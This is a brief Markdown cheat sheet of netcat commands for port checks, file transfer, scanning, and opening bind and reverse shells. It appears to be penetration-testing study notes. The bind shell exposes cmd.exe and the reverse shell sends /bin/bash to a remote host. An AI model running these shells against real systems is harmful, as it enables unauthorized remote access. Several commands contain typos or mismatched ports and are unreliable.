# Netcat

### Test open port

`nc -nv 192.168.1.125 22`

### Listening on a TCP/UDP Port

`nc -nlvp 2222`

### Transfering file using Netcat 

#### RECEIVER

`nc - nlvp 2222 > wget.exe`

#### **SENDER** 

`nc -nv 192.168.1.125 2222`

### Bind Shell

#### LISTENER 

The netcat traditional version of Netcat \(compiled with the "-DGAPING\_SECURITY\_HOLE" flag\) enables the -e option, which executes a program after making or receiving a successful connection. 

`nc -nlvp 2222 -e cmd.exe`

With the above command, Netcat has bound TCP port 2222 to cmd.exe and will redirect any input, output, or error messages from cmd.exe 

#### CLIENT 

`nc -nv 192.168.1.125 2222`

### REVERSE SHELL

#### LISTENER

`nc - nlvp 2222`

#### CLIENT \(Send Reverse shell\) 

`nc -nv 192.168.1.125 4444 -e /bin/bash`

we use the -e option to make an application available remotely, which in this case happens to be /bin/bash

### TCP Scanning

#### Port scan on ports 3000-3999

`nc -nvv -w 1 -z 3000-3999`

### UDP Scanning

`nc -nv -u -z - w 1 3000-3999`

